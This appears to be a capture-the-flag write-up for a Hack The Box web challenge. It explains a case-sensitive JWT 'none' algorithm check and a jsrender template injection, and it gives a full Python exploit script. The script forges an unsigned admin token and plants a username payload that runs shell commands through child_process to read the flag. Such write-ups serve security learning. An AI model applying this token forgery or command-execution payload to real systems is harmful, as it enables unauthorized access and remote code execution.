# Didactic Octo Paddle
The web application given is written in JS using an SQLite database, and redering HTML templates with `jsrender`. This smol e-commerce webapp allows a user to register itself, add/remove items to/from a cart. It also has an admin interface to administer users.

The first vulnerability lies in the handling of the admin JWT session: it trusts the user provided JWT algorithm. It does try to filter out the `none` alrogithm (in which the JWT signature is an empty string), but is not case sensitive:
```js
const AdminMiddleware = async (req, res, next) => {
    try {
        const sessionCookie = req.cookies.session;
        if (!sessionCookie) {
            return res.redirect("/login");
        }
        const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') { <====================== only 'none' is tested, not 'None', 'nOne', 'nOnE', etc
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res.status(403).send("You are not an admin");
            }
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
            if (
                !(await db.Users.findOne({
                    where: { id: user.id, username: "admin" },
                }))
            ) {
                return res
                    .status(403)
                    .send({ message: "You are not an admin" });
            }
        }
```

Once logged in as admin, the user page will be rendered with the user names using `jsrender`:

```js
  router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(),
            });
```

```html
      {{for users.split(',')}}
        <li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>{{>}}</span>
        </li>
      {{/for}}
```

If a user has a name using an SSTI (Server Side Template Injection), it will trigger `jsrender` to execute it.

As such, the path to victory is:

- register a normal user
- login with the normal user get the resulting JWT
- pollute the JWT algorithm with `None` (or any `none` with an uppercase), remove its signature, and alter the user `id` to `1` (which is the admin)
- register another user, which username uses a `jsrender` SSTI (using payloads from [here](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md))
- using the polluted admin JWT, visit the `/admin` page to trigger `jsrender` SSTI trying to display the usernames

The final script is the following:
```python
import requests
import base64
import json

domain = '165.232.108.240'
endpoint = "http://{}:31326".format(domain)

register = {
    'username': 'aaa',
    'password': 'bbb'
}

# https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md#jsrender-nodejs
register_ssti = {
{% raw %}
    'username': "{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}",
{% endraw %}
    'password': 'aaa'
}

s = requests.Session()
# Register
response = s.post(endpoint + '/register', json = register)
print(response.text)
# Login
response = s.post(endpoint + '/login', json = register)
print(response.text)

jwt = s.cookies['session']
jwt_alg = json.loads(base64.b64decode(jwt.split('.')[0]))
jwt_claim = json.loads(base64.b64decode(jwt.split('.')[1]))
jwt_alg['alg'] = 'None'
jwt_claim['id'] = 1

jwt_admin = base64.b64encode(json.dumps(jwt_alg).encode('utf8')) + b'.' + base64.b64encode(json.dumps(jwt_claim).encode('utf8')) + b'.'
jwt_admin = jwt_admin.decode('utf8').replace('=', '')
print(jwt_admin)
s.cookies.set("session", jwt_admin, domain=domain)

# Register SSTI
response = s.post(endpoint + '/register', json = register_ssti)
print(response.text)
# Admin
response = s.get(endpoint + '/admin')
print(response.text)
```

And the output:
```bash
$ python lol.py
{"message":"User registered succesfully"}
{"message":"Logged in successfully"}
eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpZCI6IDEsICJpYXQiOiAxNjc5NzI5ODM1LCAiZXhwIjogMTY3OTczMzQzNX0.
{"message":"User registered succesfully"}
<!DOCTYPE html>
<html lang="en">
[...]
<body>
[...]
<li class="list-group-item d-flex justify-content-between align-items-center ">
          <span>HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}
```
